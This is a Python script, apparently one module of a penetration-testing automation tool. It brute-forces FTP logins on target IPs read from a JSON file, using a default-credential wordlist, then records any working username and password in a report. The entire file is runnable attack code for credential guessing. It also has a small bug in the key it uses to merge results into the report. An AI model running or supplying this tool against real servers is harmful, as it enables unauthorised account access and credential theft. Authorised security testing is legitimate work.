import json
import ftplib
import os

json_input_path = os.path.join("penautomate_menu", "pentestreport", "results", "pentestdata.json")
json_output_path = os.path.join("penautomate_menu", "pentestreport", "results", "pentestreport.json")
ftp_file = os.path.join("penautomate_menu", "pentestreport", "tools", "wordlists", "ftp-default.txt")

def brute_force_ftp(ip, credentials):
    print(f"Starting brute force on IP: {ip}")
    for credential in credentials:
        username, password = credential.strip().split(':')
        username = username.strip()
        password = password.strip()
        try:
            print(f"Trying username: {username} and password: {password}")
            with ftplib.FTP(ip) as ftp:
                ftp.login(username, password)
                print("Login successful!")
                return True, username, password
        except ftplib.error_perm as e:
            print(f"Failed login for username: {username} with password: {password}")
            continue
    return False, None, None

def main():
    # Load data
    with open(json_input_path, 'r') as file:
        data = json.load(file)
    
    # Load previous report
    with open(json_output_path, 'r') as file:
        report = json.load(file)

    ips = [data.get(f"IP{i}") for i in range(1, 4) if data.get(f"IP{i}") is not None]

    # Load credentials
    with open(ftp_file, 'r', encoding='utf-8') as file:
        credentials = file.readlines()

    results = []

    for ip in ips:
        success, user, passw = brute_force_ftp(ip, credentials)
        if success:
            results.append({
                'ip': ip,
                'username': user,
                'password': passw,
                'result': 'Success'
            })
            print(f"Success: {ip} with user {user} and password {passw}")
        else:
            results.append({
                'ip': ip,
                'result': 'Failed'
            })
            print(f"Brute force failed for IP: {ip}")

    # Append results to the report
    if 'brute_force_results_ftp' in report:
        report['brute_force_results_ftp'].extend(results)
    else:
        report['brute_force_results'] = results

    # Save updated report
    with open(json_output_path, 'w') as file:
        json.dump(report, file, indent=4)

if __name__ == "__main__":
    main()
